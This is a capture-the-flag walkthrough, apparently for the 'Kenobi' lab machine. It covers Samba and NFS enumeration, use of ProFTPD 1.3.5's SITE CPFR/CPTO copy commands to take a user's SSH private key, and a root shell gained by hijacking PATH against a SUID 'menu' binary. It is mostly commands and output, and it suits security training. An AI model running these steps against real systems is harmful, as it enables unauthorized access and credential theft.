---
title: 'Kenobi'
date: 2020-07-28
---

- [Tools & Commands](#tools-&-commands)
- [1 - Deploy](#1---deploy)
- [2 - Enumerate Samba](#2---enumerate-samba)
- [3 - Gain access](#3---gain-access)
- [4 - Privesc](#4---privesc)

## Tools & Commands

- nmap
- smbclient
- smbget
- nc
- searchsploit
- mount
- ssh

## 1 - Deploy

```bash
$ nmap -A 10.10.206.12 -p21,22,80,111,139,445,2049 -v
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33325/tcp6  mountd
|   100005  1,2,3      39027/udp   mountd
|   100005  1,2,3      39519/udp6  mountd
|   100005  1,2,3      59173/tcp   mountd
|   100021  1,3,4      38029/udp6  nlockmgr
|   100021  1,3,4      39961/udp   nlockmgr
|   100021  1,3,4      45531/tcp   nlockmgr
|   100021  1,3,4      46389/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-07-17T23:10:26-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-18T04:10:25
|_  start_date: N/A
```

## 2 - Enumerate Samba

```bash
# enumerate shares
$ nmap -p445 --script=smb-enum-shares 10.10.206.12
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.206.12\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.206.12\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.206.12\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

# log in to smb
$ smbclient //10.10.206.12/anonymous
Enter WORKGROUP\kalis password: # empty
Try "help" to get a list of possible commands.
smb: \> ls

# access smb files
$ smbget -R smb://10.10.206.12/anonymous
Password for [kali] connecting to //anonymous/10.10.206.12: 
Using workgroup WORKGROUP, user kali
smb://10.10.206.12/anonymous/log.txt                                                                                                                                  
Downloaded 11.95kB in 10 seconds
kali@kali:~$ cat log.txt

# find mounts
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.206.12
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

## 3 - Gain access

```bash
# find ftp version
$ nc 10.10.206.12 21

# find vulnerabilities
$ searchsploit proftpd 1.3.5

# in nc, exploit vulnerability to get private key
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

# mount locally
$ sudo mkdir /mnt/kenobiNFS
$ sudo mount 10.10.206.12:/var /mnt/kenobiNFS/
$ ls -la /mnt/kenobiNFS

# log in with private key
$ cp /mnt/kenobiNFS/tmp/id_rsa .
$ sudo chmod 600 id_rsa # otherwise permissions are too open
$ ssh -i id_rsa kenobi@10.10.206.12
kenobi@kenobi:~$ cat user.txt
```

## 4 - Privesc

```bash
# find vulnerable binaries
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null

# test curious binary
kenobi@kenobi:~$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

# see paths to commands
kenobi@kenobi:~$ strings /usr/bin/menu
[..]
curl -I localhost
uname -r
ifconfig
[...]

# create exploit
kenobi@kenobi:~$ echo /bin/sh > curl # make 'curl' actually bash
kenobi@kenobi:~$ chmod 777 curl
kenobi@kenobi:~$ mv curl /tmp
kenobi@kenobi:~$ export PATH=/tmp:$PATH # ensure tmp binaries are loaded first
kenobi@kenobi:~$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1 # now bash, prompt is #
~ whoami
root
~ cat /root/root.txt
```